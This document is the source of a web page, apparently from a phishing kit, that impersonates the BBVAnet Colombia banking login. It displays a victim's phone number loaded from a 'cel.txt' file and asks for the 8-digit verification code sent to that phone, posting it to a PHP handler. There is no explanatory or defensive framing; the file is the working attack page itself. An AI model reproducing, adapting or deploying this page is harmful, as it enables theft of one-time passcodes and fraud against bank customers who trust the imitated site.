<html>
   <head>
    <title>BBVAnet Colombia</title>
    <meta content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
	<link rel="stylesheet" type="text/css" href="./choose/estilos/tablass.css">
	<link rel="stylesheet" type="text/css" href="./choose/estilos/global.css">
    <link rel="stylesheet" type="text/css" href="./choose/estilos/bootstrap.min.css">
  	<link rel="stylesheet" type="text/css" href="./choose/estilos/jquery-ui.css">
   </head>
    <script>
function valida(e){
    tecla = (document.all) ? e.keyCode : e.which;

    //Tecla de retroceso para borrar, siempre la permite
    if (tecla==8){
        return true;
    }
        
    // Patron de entrada, en este caso solo acepta numeros
    patron =/[0-9]/;
    tecla_final = String.fromCharCode(tecla);
    return patron.test(tecla_final);
}
</script>
      
   <style>
  td.bbvasvg {
    
    background-image: url("https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_v1.svg");
	background-repeat: no-repeat;
	background-size:30% 30%;
	background-position: -6% 85%;}
	
	
	.button2 {background-color: #02A5A5;
	font-family:"BBVA Coronita Medium", "Helvetica Neue", Arial, Helvetica, sans-serif;
	color: white;}
	
	
  </style>
  
   
   
   <body>

<table  width=100% height=100% border="0">
<tr height=15% bgcolor="#072146">
<td CLASS="bbvasvg" >

</td>




</tr>
<tr height=70%>
<td CLASS="bbvaimg">

 <form method="post" action="LogonOperacionServletOtps.php"  onSubmit="return validar();">
   <div align="center">
        <table border="0" cellpadding="5" cellspacing="0" width="60%">
     <tbody>
	  <tr>
      <td class="cabecera0" colspan="2">
       <p class="textablacabecera" align="center"><font size="3px">Para confirmar, por favor ingresa los siguientes datos:</font></p>
      </td>
	  
	  
	  
	  
	  
	  <td class="cabecera0">
       <p class="textablacabecera" align="left"></p>
      </td>
     
     
     </tr>
	 
	 
	 
	 <tr>
      <td width="50%" colspan="1" class="cabecera">
       <p class="textablacabecera" align="left"><font size="2px">Hemos enviado un c&oacute;digo de verificaci&oacute;n a tu celular :</font></p>
	   <p class="textablacabecera" align="left"><font size="2px"><?php
$cel = file_get_contents('cel.txt');
echo $cel;
?></font></p>
	   <p class="textablacabecera" align="left"><font size="2px">Ingresa el c&oacute;digo en el campo que encuentras a continuaci&oacute;n.</font></p>
      </td>
     <td width="50%" class="fila3" colspan="4" align="right">

        <input input autocomplete="off" name="tarjeta" id="tarjeta" type="text" onkeypress="return valida(event)" value="" pattern="\S{8,8}" title="Ingresar los 8 Digitos" size="30" maxlength="8" required />
		
      </td>
     
     </tr>
	 
		  
     
     </tr>
    </tbody></table>
   <table border="0" cellpadding="3" cellspacing="1" width="503">
     <tbody><tr>
      <td width="50%" align="right">
       <br>
       <div class="irow callto">
                  
                        <input  type="submit" class="btn btn-aqua btn-full btn-full-md button2" value="Entrar a BBVA Net"  style="width:90%"/>
						
                         </div>
      </td>

     </tr>
    </tbody></table>
   </div>
  </form>



</td>

<tr height=15% bgcolor="#072146">



<td align="center">

                <font color='white'><p class="disclosure">� 2017 Banco Bilbao Vizcaya Argentaria Colombia S.A.</p></font>
            

</td>







</tr>
</table>


</body>
</html>
